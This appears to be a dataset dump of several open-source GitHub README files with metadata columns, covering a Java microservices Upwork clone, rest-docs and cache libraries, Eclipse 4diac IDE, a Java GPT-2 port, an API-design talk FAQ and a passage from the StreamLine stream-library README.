![](https://img.shields.io/badge/DATADOG-632CA6?style=for-the-badge&logo=datadog&logoColor=white)
![](https://img.shields.io/badge/Prometheus-000000?style=for-the-badge&logo=prometheus&labelColor=000000)
![](https://img.shields.io/badge/New-Relic-1CE783?style=for-the-badge&logo=newrelic&logoColor=white)
![](https://img.shields.io/badge/UpWork-6FDA44?style=for-the-badge&logo=Upwork&logoColor=white)
![](https://img.shields.io/badge/Github%20Actions-282a2e?style=for-the-badge&logo=githubactions&logoColor=367cfe)


## Builds

![build](https://github.com/Ahmad45123/workup/actions/workflows/maven.yml/badge.svg)
![build](https://github.com/Ahmad45123/workup/actions/workflows/maven-publish.yaml/badge.svg)
![build](https://github.com/Ahmad45123/workup/actions/workflows/maven-temp.yml/badge.svg)
[![codecov](https://codecov.io/gh/Ahmad45123/workup/graph/badge.svg?token=DICIEAQBM2)](https://codecov.io/gh/Ahmad45123/workup)

Welcome to WorkUp, a scalable distributed microservices application designed to replicate the core functionalities of Upwork. ğŸš€ This project leverages a suite of modern technologies to ensure blazingly fast performance ğŸ”¥, reliability, and scalability.

## Table of Contents

1. [Project Overview](#project-overview)
2. [Architecture](#architecture)
3. [Components](#components)
   - [Microservices](#microservices)
     - [Users Microservice](#users-microservice)
     - [Payments Microservice](#payments-microservice)
     - [Jobs Microservice](#jobs-microservice)
     - [Contracts Microservice](#contracts-microservice)
   - [Message Queues](#message-queues)
   - [Web Server](#web-server)
   - [Controller](#controller)
   - [Auto-scaler](#auto-scaler)
4. [Testing](#testing)
5. [Contributing](#contributing)
6. [License](#license)

## Project Overview

WorkUp is a microservices-based application that allows freelancers and clients to connect, collaborate, and complete projects, similar to Upwork. ğŸ’¼ The system is designed with scalability and resilience in mind, utilizing various technologies to handle high traffic and large data volumes efficiently. ğŸš€

## ğŸ›ï¸ Architecture

![workup_arch](https://github.com/Ahmad45123/workup/assets/37817681/832314bd-b77e-43fb-a75e-7f905e46d55c)


## ğŸ§© Components

<details>
   <summary>
      Swarm on the machines
   </summary>
   
   ![image](https://github.com/Ahmad45123/workup/assets/35760882/27bcc9e8-316c-4248-b470-b975a6411962)
   ![image](https://github.com/Ahmad45123/workup/assets/35760882/4d2222b6-127d-4fb3-9f04-150b3f495daa)
   
</details>



### ğŸ—ï¸ Microservices

- All microservices are implemented using Java Spring Boot â˜•.
-  They consume messages from the RabbitMQ message broker ğŸ° and respond through RabbitMQ as well.
- Requests are cached in Redis, so if the same request is sent more than once, there is no need to recompute the response every time as it can be retrieved directly from the cache ğŸ—ƒï¸.
- All the microservices are stateless, as authentication and authorization are handled by the web server.
- In some cases, a microservice would have to communicate with another one to complete a certain functionality, which is done through RabbitMQ. Every microservice can be scaled up or down independently of other microservices to adapt to the amount of incoming traffic.
- Every microservice has its database that is shared by all the instances of the same microservice but cannot be accessed by other microservices.

<details>
   <summary>
      ğŸ‘¥ Users Microservice
   </summary>
   This microservice handles user-related operations, like updating, fetching, deleting, and creating profiles, register & login ğŸ‘¤. In the case of register or login, a JWT is created and returned in the response, which will be used by the client to authorize future communications with the system ğŸ”‘. The database used for this microservice is MongoDB ğŸƒ, as it achieves horizontal scalability, is highly available, and provides higher performance for reads and writes than relational databases. MongoDB 4.0 and later supports ACID transactions to some extent, which was enough for the users' microservice use case. 
</details>

<details>
   <summary>
      ğŸ’³ Payments Microservice
   </summary>
   This microservice handles payment-related requests ğŸ’³. Both freelancers and clients have wallets, which they can add or withdraw money from. Both of them have a history of transactions, and freelancers can issue payment requests that are then paid by the clients, and the money is deposited into the freelancer's wallet. When the payment is completed, the contracts service is notified that the contract associated with this payment should be marked as done. The DB used for this service is PostgreSQL ğŸ˜, as payments require lots of ACID transactions in addition to strict consistency, which is achieved by relational databases.
</details>


<details>
   <summary>
       ğŸ”§ Jobs Microservice
   </summary>
   This microservice handles jobs and proposal requests ğŸ“. Clients can create jobs, and view, and accept proposals for their jobs. Freelancers can browse jobs and search for them using keywords ğŸ”. They can submit a proposal to any job, specifying the milestones that will achieve that job and any extra attachments. When a client accepts a proposal, the contracts service is notified about it to initiate a contract for that job ğŸ“œ. The used DB for this microservice is Cassandra, as it can be scaled horizontally easily and is highly available and fault-tolerant, thanks to its peer-to-peer decentralized architecture. There is no need to have a relational DB for jobs, since there are not many joins performed, and there is no need for strong consistency and strict schema. However, high availability is critical, as most of the time users will be browsing jobs, which implies high traffic on the DB.
</details>

<details>
   <summary>
      ğŸ“œ Contracts Microservice
   </summary>
   This microservice is responsible for contract-related logic ğŸ“‘. It handles the termination and creation of contracts. Freelancers can update their progress in a milestone of their contracts, while clients can add evaluation to every milestone. Cassandra was used as a database for this microservice for the same reasons as the jobs microservice: scalability, high availability, and fault tolerance.
</details>



### ğŸ“¬ Message Queues

For this project, RabbitMQ was used for asynchronous communication between different components ğŸ°. A worker queue is assigned to every microservice, where all instances listen to it, while only one of them (the most available one) consumes the message and sends the response back if needed. In addition, a fanout exchange is created to allow the controller to send configuration messages that are consumed by all the running instances of a certain microservice.

### ğŸŒ Web Server

The web server is considered the API gateway for the backend of the system. It has a defined REST endpoint for every command in the four microservices. The web server takes the HTTP requests and converts them to message objects that can be sent and consumed by the designated microservice. After the execution is done, the web server receives the response as a message object, converts it to an HTTP response, and sends it back to the client. The web server handles authentication, as it checks the JWT sent with the request to determine whether the user is currently logged in ğŸ”‘. After that, it extracts the user ID from the JWT and attaches it to the message that is sent to the worker queues.

#### API documentation
##### Introduction
Welcome to the Workup API documentation. This API provides endpoints for managing jobs, proposals, contracts, payments, and user authentication.

##### Authentication
All endpoints require authentication using a bearer token. Include the token in the Authorization header of your requests. 

```bash
Authorization: Bearer <your_access_token>
```

<details>
   <summary>
      Get Job
   </summary>
Description: Retrieves details of a specific job.

- URL: /api/v1/jobs/{job_id}
- Method: GET

Request Parameters
- job_id (path parameter): The ID of the job to retrieve.
- Example Request

```bash
GET /api/v1/jobs/7ddda13b-8221-4766-983d-9068a6592eba
Authorization: Bearer <your_access_token>
```

Response
- 200 OK: Returns the details of the requested job.

```json
{
  ""id"": ""7ddda13b-8221-4766-983d-9068a6592eba"",
  ""title"": ""Sample Job"",
  ""description"": ""This is a sample job description."",
  ...
}
```
- 404 Not Found: If the job with the specified ID does not exist.

</details>

<details>
   <summary>
      Get Proposals
   </summary>
   
 
Description: Retrieves all proposals for a specific job.
- URL: /api/v1/jobs/{job_id}/proposals
- Method: GET

Request Parameters
- job_id (path parameter): The ID of the job to retrieve - - - proposals for.
```bash
GET /api/v1/jobs/7ddda13b-8221-4766-983d-9068a6592eba/proposals
Authorization: Bearer <your_access_token>
```

Response
- 200 OK: Returns a list of proposals for the specified job.
```json
[
  {
    ""id"": ""73fb1269-6e05-4756-93cc-947e10dac15e"",
    ""job_id"": ""7ddda13b-8221-4766-983d-9068a6592eba"",
    ""cover_letter"": ""Lorem ipsum dolor sit amet..."",
    ...
  },
  ...
]

```
- 404 Not Found: If the job with the specified ID does not exist
</details>
<details>
   <summary>
       Get Contract
   </summary>
   
Description: Retrieves details of a specific contract.

- URL: /api/v1/contracts/{contract_id}
- Method: GET

Request Parameters
- contract_id (path parameter): The ID of the contract to retrieve.


```bash
GET /api/v1/contracts/702a6e9a-343b-4b98-a86b-0565ee6d8ea5
Authorization: Bearer <your_access_token>
```

Response
- 200 OK: Returns the details of the requested contract.

```json
{
  ""id"": ""702a6e9a-343b-4b98-a86b-0565ee6d8ea5"",
  ""client_id"": ""2d816b8f-592c-48c3-b66f-d7a1a4fd0c3a"",
  ...
}

```


- 404 Not Found: If the contract with the specified ID does not exist.
</details>

<details>
   <summary>
      Create Proposal
   </summary>
   
 
Description: Creates a new proposal for a specific job.

- URL: /api/v1/jobs/{job_id}/proposals
- Method: POST
Request Parameters
- job_id (path parameter): The ID of the job to create a proposal for.

Request Body
```json
{
  ""coverLetter"": ""I am interested in this job..."",
  ""jobDuration"": ""LESS_THAN_A_MONTH"",
  ""milestones"": [
    {
      ""description"": ""First milestone"",
      ""amount"": 500,
      ""dueDate"": ""2024-06-01""
    },
    ...
  ]
}

```


Response
- 201 Created: Returns the newly created proposal.

```json
{
  ""id"": ""73fb1269-6e05-4756-93cc-947e10dac15e"",
  ""job_id"": ""7ddda13b-8221-4766-983d-9068a6592eba"",
  ...
}

```
- 404 Not Found: If the job with the specified ID does not exist.
</details>

<details>
   <summary>
       Get Proposal
   </summary>
   
Description: Retrieves details of a specific proposal.

- URL: /api/v1/proposals/{proposal_id}
- Method: GET

Request Parameters
- proposal_id (path parameter): The ID of the proposal to retrieve.
```bash
GET /api/v1/proposals/73fb1269-6e05-4756-93cc-947e10dac15e
Authorization: Bearer <your_access_token>

```

Response
- 200 OK: Returns the details of the requested proposal.

```json
{
  ""id"": ""73fb1269-6e05-4756-93cc-947e10dac15e"",
  ""job_id"": ""7ddda13b-8221-4766-983d-9068a6592eba"",
  ...
}
```

- 404 Not Found: If the proposal with the specified ID does not exist.
  </details>

<details>
   <summary>
      Update Proposal
   </summary>
   
Description: Updates an existing proposal.

- URL: /api/v1/proposals/{proposal_id}
- Method: PUT

Request Parameters
- proposal_id (path parameter): The ID of the proposal to update.


Request Body
```json
{
  ""coverLetter"": ""Updated cover letter..."",
  ""jobDuration"": ""ONE_TO_THREE_MONTHS"",
  ""milestones"": [
    {
      ""description"": ""Updated milestone"",
      ""amount"": 600,
      ""dueDate"": ""2024-06-15""
    },
    ...
  ]
}

```

Response
- 200 OK: Returns the updated proposal.
```json
{
  ""id"": ""73fb1269-6e05-4756-93cc-947e10dac15e"",
  ""job_id"": ""7ddda13b-8221-4766-983d-9068a6592eba"",
  ...
}
```
- 404 Not Found: If the proposal with the specified ID does not exist.
</details>

### ğŸ›ï¸ Controller


The controller provides a CLI that is used to broadcast configuration messages to all the running instances of a certain microservice ğŸ–¥ï¸. These messages configure the services in runtime without having to redeploy any instance, to achieve zero downtime updates â²ï¸. Here are the messages sent by the controller:

- `setMaxThreads`: Sets the maximum size of the thread pool used by a microservice.
- `setMaxDbConnections`: Sets the maximum number of database connections in the connections pool for a microservice. This is used only for the payments microservice since it is the only one using PostgreSQL, which allows connection pooling.
- `freeze`: Makes the microservice stop consuming any new messages, finishes the execution of any messages received by them, then releases all resources.
- `start`: Restarts a frozen microservice.
- `deleteCommand`: Deletes a command in a certain microservice in runtime. So the microservice no longer accepts requests of a certain type without having to redeploy all instances.
- `updateCommand`: Updates the logic performed by a certain command in runtime by byte code manipulation, which allows runtime updates while having zero downtime.
- `addCommand`: Adds a command that was deleted before from the microservice, to allow it to accept requests of that type again.
- `setLoggingLevel`: Sets the level of logs that should be logged (ERROR, INFO, etc.).
- `spawnMachine`: Replicates the whole backend on a new machine (the web server, the 4 microservices, the messaging queue, etc.).

### ğŸ“º Media Server
A media server that serves static resources.

#### ENV 

- `UPLOAD_USER`
- `UPLOAD_PASSWORD`
- `DISCOGS_API_KEY`


#### Static Endpoints

For all static resources, this server will attempt to return a relevant resource ğŸ“, or else if the resource does not exist, it will return a default 'placeholder' resource ğŸ–¼ï¸. This prevents clients from having no resource to display at all; clients can make use of this media server's 'describe' endpoint to learn about what resources are available ğŸ“‹.

<details>
   <summary>
      Get resource
   </summary>
   

#### `GET` /static/icons/:icon.png

Returns an icon based on the filename.

`:icon` can be any icon filename.

Example: return an icon with filename 'accept.png'.

```bash
curl --request GET \
  --url http://path_to_server/static/icons/accept.png
```

#### `GET` /static/resume/:resume.pdf
 
Returns a resume based on the filename.

`:resume` can be any resume filename.

Example: return a resume with filename 'resume.pdf'.

```bash
curl --request GET \
  --url http://path_to_server/static/resume/resume.pdf
```

</details>

<details>
   <summary>
      Available groups
   </summary>
   
#### Describe

#### `GET` /describe

Returns a JSON representation of the media groups.

Example: return JSON containing of all groups present.

```bash
curl --request GET \
  --url http://localhost:8910/describe
```

```json
{
  ""success"": true,
  ""path"": ""/static/"",
  ""groups"": [""icons"", ""resume""]
}
```

#### `GET` /describe/:group

Returns a JSON representation of all the files current present for a given group.

`:group` can be any valid group.

Example: return JSON containing all the media resources for a the exec resource group.

```bash
curl --request GET \
  --url http://localhost:8910/describe/exec
```

```json
{
  ""success"": true,
  ""path"": ""/static/exec/"",
  ""mimeType"": ""image/jpeg"",
  ""files"": []
}
```
</details>

<details>
   <summary>
      Upload
   </summary>
   

Upload and convert media to any of the given static resource groups.

All upload routes are protected by basic HTTP auth. The credentials are defined by ENV variables `UPLOAD_USER` and `UPLOAD_PASSWORD`.

#### `POST` /upload/:group

POST a resource to a given group, assigning that resource a given filename.

`:group` can be any valid group.

```bash
curl --location 'http://path-to-server/upload/resume/' \
--header 'Authorization: Basic dXNlcjpwYXNz' \
--form 'resource=@""/C:/Users/ibrah/Downloads/Ibrahim_Abou_Elenein_Resume.pdf""' \
--form 'filename=""aboueleyes-reume-2""'
```

```json
{
  ""success"": true,
  ""path"": ""/static/resume/aboueleyes-resume-2.pdf""
}
```

A resource at `http://path_to_server/static/resume/aboueleyes-reume-2.pdf` will now be available.

</details>

## ğŸš€ Deployment

![Digital Ocean](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQfQxeW7i7mdvQqs7IdiokF0IIaenP9OvqO7NZLVNca&s)

We were able to set up a tenant on [Digital ocean](https://try.digitalocean.com/cloud/?utm_campaign=emea_brand_kw_en_cpc&utm_adgroup=Misspellings&_keyword=digitalocean%27&_device=c&_adposition=&utm_content=conversion&utm_medium=cpc&utm_source=google&gad_source=1&gclid=CjwKCAjwr7ayBhAPEiwA6EIGxFUoqeEw6G9c-Vh1FvlsGCa6kaL7uDHwQMuVojoNVrMNXKcXnJ906BoCFVwQAvD_BwE) ğŸŒ Where we can create new instance (Droplet) ğŸ’§  from the Controller as explained above and feeding scripts in the startup of this instance to join docker swarm ğŸ³ of other machines. 


We can monitor the performance of each running container on each instance using [Portainer](https://www.portainer.io/)  ğŸ“Š where we can manually run more containers of the same service, and configure it to auto-scale when the load is above the threshold. 


We tested the app in the hosted state and even performed load testing on it.âœ…

## ğŸ“ˆ Auto-scaling

his script utilizes Prometheus paired with cAdvisor metrics to determine CPU usage ğŸ“Š. It then utilizes a manager node to determine if a service wants to be autoscaled and uses another manager node to scale the service.

Currently, the project only utilizes CPU to autoscale. If CPU usage reaches 85%, the service will scale up; if it reaches 25%, it will scale down â¬†ï¸â¬‡ï¸.

2. if you want to autoscale you will need a deploy label `swarm.autoscaler=true`. 

```
deploy:
  labels:
    - ""swarm.autoscaler=true""
```

This is best paired with resource constraints limits. This is also under the deploy key.

```
deploy:
  resources:
    reservations:
      cpus: '0.25'
      memory: 512M
    limits:
      cpus: '0.50'
```

<details>
   <summary>
      Configuration
   </summary>
   
 
| Setting | Value | Description |
| --- | --- | --- |
| `swarm.autoscaler` | `true` | Required. This enables autoscaling for a service. Anything other than `true` will not enable it |
| `swarm.autoscaler.minimum` | Integer | Optional. This is the minimum number of replicas wanted for a service. The autoscaler will not downscale below this number |
| `swarm.autoscaler.maximum` | Integer | Optional. This is the maximum number of replicas wanted for a service. The autoscaler will not scale up past this number | 

</details>

## Load Balancing

We used a round-robin-based load balancing ğŸ”„ that is handled by Docker in the Swarm ğŸ³. Simply, it sends the first request to the first instance of the app (not for a machine) and the next request to the next instance, and so on until all instances have received a request. Then, it starts again from the beginning. ğŸš€

## ğŸ§ª Testing

### Functional Testing

To test our app functionality we created functional testing for each service on its own to test functionality in isolation as well as testing its functionality in integration with other services for example [here](services\payments\src\test\java\com\workup\payments\PaymentsApplicationTests.java) is the tests implemented for Payments service.ğŸ§ªğŸ”§


### âš–ï¸ Load Balancing

<details>
   <summary>
      Jmeter
   </summary>
   
![jmeter](https://i0.wp.com/cdn-images-1.medium.com/max/800/1*KeuQ7uNalz2l4rBOyPAUpg.png?w=1180&ssl=1)

We used JMeter to load test our app we configured it to simulate thousands of users' requests and the number grew gradually over the span of 10 seconds. here are some results for different endpoints. Here are a few examples of endpoint performance.
</details>

<details>
   <summary>
      Login Performance
   </summary>
    
![login command](https://media.discordapp.net/attachments/1210626240986226741/1241779393614057562/image.png?ex=664ebc6e&is=664d6aee&hm=f33b046fa5bb5117cf1b75dd70d34f3b6bbcb2e11f6e639e3dc1bf3802ff7b79&=&format=webp&quality=lossless)

</details>

<details>
   <summary>
       Create Job
   </summary>
   
   ![Create Job](https://media.discordapp.net/attachments/1210626240986226741/1241782178824716339/image.png?ex=664ebf06&is=664d6d86&hm=673ee8ac6d1d218aa49aa0491e96f11dd3f536a8f69d6fb69d8e47bf14863a84&=&format=webp&quality=lossless)
   
</details>


<details>
   <summary>
      Get Jobs
   </summary>
   
![get jobs](https://media.discordapp.net/attachments/1210626240986226741/1241787039603490858/image.png?ex=664ec38d&is=664d720d&hm=61b2c43df718b627191b90be4c24ff6d870e44b86294546b73da0f566015cdcc&=&format=webp&quality=lossless)

</details>
<details>
   <summary>
       Get Contracts
   </summary>
   
![get contracts](https://media.discordapp.net/attachments/1210626240986226741/1241803839947145387/image.png?ex=664ed333&is=664d81b3&hm=2ab4e1c58e3224a0c0f6ef8e4eee08330fb8e68e914ef2e3f586bc16f41d0b90&=&format=webp&quality=lossless)

</details>

<details>
   <summary>
      Locust
   </summary>

   
![locust](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTOchmJvYjMucoFZDd2NVX6uLPNci5uEhBzF1vHDJMJ0Q&s)

We also used `Python` [locust](https://locust.io/) for load testing. check the test file [here](https://github.com/Ahmad45123/workup/blob/main/locustfile.py). Here are the results of this load test

![requeststats](https://media.discordapp.net/attachments/1210626240986226741/1242789353558769664/image.png?ex=664f1d47&is=664dcbc7&hm=c6838d6f086a3f04688f7189fa042a0f3d07dee9026f389f804ef56fad88be84&=&format=webp&quality=lossless&width=863&height=676)

![charts](https://media.discordapp.net/attachments/1210626240986226741/1242789434923946076/image.png?ex=664f1d5b&is=664dcbdb&hm=d551fd87c5ebc96de32e9119ff41596bf54de326491ce3007f4a6f695865f1fb&=&format=webp&quality=lossless&width=861&height=676)

</details>



## License

This project is licensed under the GNU General Public License v3.0. See the [LICENSE](LICENSE) file for more details.
",0,0,10,79.0,"['workup', 'a', 'scalable', 'distributed', 'microservices', 'application', 'build', 'table', 'content', 'project', 'overview', 'architecture', 'component', 'microservices', 'message', 'queue', 'web', 'server', 'api', 'documentation', 'introduction', 'authentication', 'controller', 'medium', 'server', 'env', 'static', 'endpoint', 'get', 'get', 'describe', 'get', 'get', 'group', 'post', 'group', 'deployment', 'load', 'balance', 'test', 'functional', 'testing', 'load', 'balancing', 'license']","['get', 'microservices', 'server', 'group', 'load']",8.0,"[com.cosium.code:git-code-format-maven-plugin,com.rudikershaw.gitbuildhook:git-build-hook-maven-plugin,org.jacoco:jacoco-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,7.0,1.0
Hejow/easy-restdocs-generator,main,"# Easy Spring Rest-docs Generator
[![Maven Central](https://img.shields.io/maven-central/v/io.github.hejow/easy-restdocs-generator.svg)](https://central.sonatype.com/artifact/io.github.hejow/easy-restdocs-generator)
[![GitHub license](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://github.com/Hejow/easy-restdocs-generator/blob/main/LICENSE)

### This is a generator that suggest easier way to use rest-docs.

## Install
- `JDK 17` or higher is required
- `Spring Boot 3.X` is required

### Gradle

```groovy
testImplementation(""io.github.hejow:easy-restdocs-generator:0.0.8"")
```

### Maven

```xml
<dependency>
    <groupId>io.github.hejow</groupId>
    <artifactId>easy-restdocs-generator</artifactId>
    <version>0.0.8</version>
    <scope>test</scope>
</dependency>
```

## How to use
Only you have to do is **Customize tags** and **Use builder**.

### Customize tags
To specify your api, easy-restdoc use `ApiTag` to generate documents.  

```java
// example
public enum MyTag implements ApiTag {
  USER(""user api"");

  private final String content;  

  // ... constructor

  @Override
  public String getName() {
    return this.content;
  }
}
```

### Use builder
After test with `mockMvc` just use builder to generate as like below.

Planning to support `RestAssured`.

> ### ğŸ’¡ Tips
> 
> To generate documents you MUST put `tag`, `result` on `Builder`.
> 
> If you donâ€™t put `identifier` on `Builder`, Method name of the test you wrote will be used as `identifier`
> 
> Tests MUST run with rest-docs settings such as `@ExtendWith(RestDocumentationExtension.class)` ([see here](https://github.com/Hejow/easy-restdocs-generator/blob/f25657a5aa20f813d9814d00b661bf6e11d300dd/sample/src/test/java/com/simplerestdocs/user/UserControllerTest.java#L45))

```java
// example
@Test
void myTest() throws Exception {
  // given
  
  // when
  var result = mockMvc.perform(...);

  // then
  result.andExpectAll(
    status().isOk(),
    ...
  );

  // docs
  result.andDo(
    RestDocument.builder()
      .identifier(""identifier of your API"") // Can skip
      .tag(MyTag.USER) // Custom tags
      .summary(""this will be name of API"")
      .description(""write description about your API"")
      .result(result) // Test result
      .generateDocs()
  );
}
```
",3,0,1,0.0,"['easy', 'spring', 'generator', 'this', 'generator', 'suggest', 'easy', 'way', 'use', 'install', 'gradle', 'maven', 'how', 'use', 'customize', 'tag', 'use', 'builder', 'tip']","['use', 'easy', 'generator', 'spring', 'this']",1.0,[],0.0,1.0,0.0
linux-china/sieve-cache,main,"SIEVE Cache in Java
===================

SIEVE is simpler than LRU with following features:

* Simplicity: easy to implement and can be easily integrated into existing systems.
* Efficiency: achieves state-of-the-art efficiency on skewed workloads.
* Cache Primitive: facilitates the design of advanced eviction algorithms.

![How it works](how-it-works.png)

# Get started
 
* Add dependency to `pom.xml`:

```xml
<dependency>
    <groupId>org.mvnsearch</groupId>
    <artifactId>sieve-cache</artifactId>
    <version>0.1.0</version>
</dependency>
```
* Create a cache instance and use it:

```
   Cache<String> cache = new SieveCache<>();
   cache.put(""nick"", ""Jackie"");
   System.out.println(cache.get(""nick""));
```

# References
        
* SIEVE: https://cachemon.github.io/SIEVE-website/
* SIEVE is simpler than LRU: https://cachemon.github.io/SIEVE-website/blog/2023/12/17/sieve-is-simpler-than-lru/",1,1,1,0.0,"['get', 'start', 'reference']","['get', 'start', 'reference']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,0.0
eclipse-4diac/4diac-ide,release,"# Eclipse 4diac's 4diac IDE

[4diac IDE](https://eclipse.dev/4diac/en_ide.php) is an integrated development environment for developing distributed Industrial Process Measurement and Control Systems (IPMCS) utilizing the IEC 61499 standard. 

## License

4diac IDE is licensed under an [EPL 2.0](LICENSE.md).

## Contributing

We use [contribution policy](CONTRIBUTING.md), which means we can only accept contributions under
the terms of [Eclipse Contributor Agreement](http://www.eclipse.org/legal/ECA.php).


## Building 4diac IDE

For building 4diac IDE simple run

   `mvn install`
   
in the root directory of 4diac IDE source code. After the build completes you can find 4diac IDE packages for Windows, Linux and MacOS in the directory:
    
   `plugins/org.eclipse.fordiac.ide.product/target` 

More information on how to build, run and extend 4diac IDE can be found in our [Building 4diac IDE Documentation](https://www.eclipse.org/4diac/en_help.php?helppage=html/development/building4diac.html)


## Links

* [Home page](https://www.eclipse.org/4diac)
* [Documentation](https://www.eclipse.org/4diac/en_help.php) 
* [Mailing list](https://dev.eclipse.org/mailman/listinfo/4diac-dev)
* [Wiki](https://wiki.eclipse.org/Eclipse_4diac_Wiki)
* [Examples](https://github.com/eclipse-4diac/4diac-examples)
* [4diac IDE Nightly builds](https://download.eclipse.org/4diac/updates/nightly)


## Issue/bug trackers

* [4diac IDE Github Issues](https://github.com/eclipse-4diac/4diac-ide/issues)

",0,17,4,554.0,"['eclipse', 'ide', 'license', 'contribute', 'build', 'ide', 'link', 'tracker']","['ide', 'eclipse', 'license', 'contribute', 'build']",6.0,[],0.0,6.0,0.0
harryjackson/llm.java,main,"# llm.java

Large Language Model (LLM) example in java i.e. GPT2. This is a port of 
the [Llm.c code that lives here](https://github.com/karpathy/llm.c) written 
by @[karpathy](https://github.com/karpathy) 

## Before Running ChatGPT2 in Java

Before attempting to run this some prep work needs to happen. If you check 
the [llm.c repository](https://github.com/karpathy/llm.c) these steps are very similar. 
The reason the same code is in this repository is because LLM.c is still a moving target.

I highly recommend running the original llm.c to see it work. It's wonderful.

```bash
python -m venv .venv
source .venv/bin/activate
python -m pip install -r requirements.txt
python prepro_tinyshakespeare.py
python train_gpt2.py
```

### JVM Requirements

I used the GraalVM for this running version 21. If you're using sdkman.

```bash
sdk default java 21.0.2-graalce
```

I tested the following JVM version and they all seem to work. I have not investigated why some are slower than 
others.

1. Temurin: This ran at half the speed of Graal. I stopped it at step 10

```bash
sdk install java 21-tem
sdk use java 21-tem
```

2. Correto: This VM was also really slow compared to Graal. So I stopped it after step 10

```bash
sdk install java 21.0.3-amzn
sdk use java 21.0.3-amzn
```


## Running

Note the arguments passed to the JVM. Of particular note is ""-Djava.util.concurrent.ForkJoinPool.common.parallelism=10"", 
adjust this based on how many cores you have. The matrix multiplication methods are entirely CPU bound so adding more
threads than cores will just slow things down. 

```bash
mvn clean install;
java -jar -ea --add-modules jdk.incubator.vector --enable-preview -Xmx8g -Djava.util.concurrent.ForkJoinPool.common.parallelism=10 target/gpt2-1.0-SNAPSHOT.jar
```

## Performance

I've made no attempt to tune this for performance. The C version is still much faster than this version. There are 
some low-hanging fruit like parallelizing some of the loops. I made the matmul_forward and matmul_backward both 
parallel because it was painfully slow without it.
",0,0,3,0.0,"['before', 'run', 'java', 'jvm', 'requirement', 'run', 'performance']","['run', 'before', 'java', 'jvm', 'requirement']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0
sweelam/api-design-and-management-talk,main,"## In this FAQ you will find the talks overview, and contents that will be covered. You can also watch the videos of the talks on [API Design and Management](https://www.youtube.com/playlist?list=PLgAqrVq84PDcOryFRPZmhXR_FwGauGtyv)

# What are these talks about?
The talks are about API design in the context of microservices architecture and distributed systems, you can learn inside the followings:
1. Course Introduction
2. Understanding APIs
3. API Design Principles
4. RESTful API Design
5. Advanced API Protocols
6. API Documentation and Specification
7. API Security
8. API Testing and Quality Assurance
9. API Management and Lifecycle
10. Conclusion

# What is the language for the talks?
**Arabic with little English for technical idioms**

# Who can watch the talks?
The talks are for anyone who is writing software, this might include software engineers (backend or frontend), devops engineers, and sysadmins.

# Are the talks for any level?
The talks are for all levels from beginners to professionals

# What are the prerequisites to follow up on these talks?
There are no prerequisites, however, [The Microservices talks](https://www.youtube.com/playlist?list=PLgAqrVq84PDdfiDow3YVsgc1q34JD415Z) will add the most value. 

# Is there any practical part of the talks?
The talks focus on the practices.

# Which programming language is used in the talks?
Java, Python, and nodejs

# Where can I find the material?
The presentation is attached in this repo, you can download it ""api-design-and-management.pdf""

# Where can I find the source code examples?
The main source code repo is ? , however we might add more examples that will be shared in video description
",0,0,4,5.0,"['in', 'faq', 'find', 'talk', 'overview', 'content', 'cover', 'you', 'also', 'watch', 'video', 'talk', 'api', 'design', 'management', 'http', 'what', 'talk', 'about', 'what', 'language', 'talk', 'who', 'watch', 'talk', 'are', 'talk', 'level', 'what', 'prerequisites', 'follow', 'talk', 'be', 'practical', 'part', 'talk', 'which', 'programming', 'language', 'use', 'talk', 'where', 'i', 'find', 'material', 'where', 'i', 'find', 'source', 'code', 'example']","['talk', 'find', 'what', 'watch', 'language']",6.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.asciidoctor:asciidoctor-maven-plugin,org.flywaydb:flyway-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,6.0,0.0
YunaBraska/streamline,main,"# StreamLine

StreamLine is an enhanced Java Stream API optimized for concurrent processing, leveraging the power of Project Loom's
virtual threads. Designed to provide superior performance in multithreaded environments, it simplifies the usage of
streams without the common pitfalls of resource management in standard Java streams.

[![Build][build_shield]][build_link]
[![Maintainable][maintainable_shield]][maintainable_link]
[![Coverage][coverage_shield]][coverage_link]
[![Issues][issues_shield]][issues_link]
[![Commit][commit_shield]][commit_link]
[![Dependencies][dependency_shield]][dependency_link]
[![License][license_shield]][license_link]
[![Central][central_shield]][central_link]
[![Tag][tag_shield]][tag_link]
[![Javadoc][javadoc_shield]][javadoc_link]
[![Size][size_shield]][size_shield]
![Label][label_shield]
![Label][java_version]

## Motivation

Traditional Java streams are powerful but also come with big limits cause of the shared ForkedJoinPool which is not
replaceable and also not programmatically configurable.
Java's parallel streams start blocking each other in concurrent environments, leading to performance bottlenecks.
Therefore, StreamLine was created to address these shortcomings.

### Benefits

- **High-Performance Streaming**: Takes full advantage of Project Loom's virtual threads for efficient non-blocking
  concurrency.
- **Simple API**: Offers a straightforward approach to parallel and asynchronous streaming operations.
- **Resource Management**: Designed to avoid typical issues related to stream resource management, ensuring cleaner and
  safer code.
- **Enhanced Scalability**: Performs exceptionally well under high-load conditions, scaling effectively across multiple
  cores.
- **Pure Java**: No external dependencies for a lightweight integration.
- **Functional Design**: Embraces modern Java functional paradigms.
- **No Reflection**: Ensures compatibility with GraalVM native images.

### Prerequisites

* Java 21 or later and for using Project Loom

### Usage

```java
import berlin.yuna.streamline.model.StreamLine;

public class Example {
    public static void main(final String[] args) {
        StreamLine.of(""one"", ""two"", ""three"")
            .threads(-1) // Use unlimited threads
            .forEach(System.out::println);
    }
}
```

With custom thread pool:

```java
import berlin.yuna.streamline.model.StreamLine;

import java.util.concurrent.ForkJoinPool;

public class Example {
    public static void main(final String[] args) {
        final ForkJoinPool executor = new ForkJoinPool();
        
        StreamLine.of(executor, ""one"", ""two"", ""three"")
            .threads(-1) // Use unlimited threads
            .forEach(System.out::println);
    }
}
```

### StreamLine Performance

Each method is tested with 10 concurrent streams including 10 tasks for every stream.
CPU cores: 10.

| Method                    | Time  |
|---------------------------|-------|
